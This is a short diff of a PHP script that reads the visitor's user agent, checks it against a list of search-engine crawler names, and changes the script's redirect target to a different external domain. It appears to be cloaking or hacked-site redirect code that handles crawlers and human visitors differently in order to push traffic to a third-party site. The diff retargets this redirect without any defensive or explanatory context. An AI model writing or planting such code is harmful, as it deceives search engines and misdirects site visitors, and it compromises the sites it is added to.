@@ -5,7 +5,7 @@ header('Vary: User-Agent');
 
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-$urlTo = "https://www.bluebirdgroupid.org/";
+$urlTo = "https://visionpublisher.info/";
 
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
